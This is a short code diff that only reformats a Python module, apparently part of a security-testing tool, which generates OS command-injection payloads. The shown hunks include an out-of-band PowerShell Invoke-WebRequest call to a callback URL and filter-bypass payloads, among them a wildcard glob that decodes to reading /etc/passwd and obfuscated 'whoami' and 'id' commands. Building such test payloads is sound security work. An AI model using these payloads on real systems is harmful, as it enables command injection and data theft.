@@ -70,9 +70,7 @@ def direct_payloads(platform: str = "linux") -> Generator[dict, None, None]:
         yield from windows_payloads
 
 
-def time_based_payloads(
-    delay: int = 5, platform: str = "linux"
-) -> Generator[dict, None, None]:
+def time_based_payloads(delay: int = 5, platform: str = "linux") -> Generator[dict, None, None]:
     """
     Payloads for blind command injection via time delays.
     CWE-78: Blind OS Command Injection.
@@ -199,7 +197,7 @@ def oob_payloads(callback_url: str, platform: str = "linux") -> Generator[dict, 
         },
         # PowerShell HTTP
         {
-            "payload": f"& powershell -c \"Invoke-WebRequest {callback_url}/\"",
+            "payload": f'& powershell -c "Invoke-WebRequest {callback_url}/"',
             "type": "http",
             "separator": "&",
             "shell": "powershell",
@@ -282,7 +280,11 @@ def filter_bypass_payloads(platform: str = "linux") -> Generator[dict, None, Non
         # Hex encoding
         {"payload": "$(printf '\\x69\\x64')", "bypass": "hex", "decoded": "id"},
         # Wildcard bypass
-        {"payload": "/???/??t /???/p??s??", "bypass": "wildcard", "decoded": "/bin/cat /etc/passwd"},
+        {
+            "payload": "/???/??t /???/p??s??",
+            "bypass": "wildcard",
+            "decoded": "/bin/cat /etc/passwd",
+        },
         # Concatenation
         {"payload": "wh''oami", "bypass": "empty_quote"},
         {"payload": 'wh""oami', "bypass": "empty_quote"},
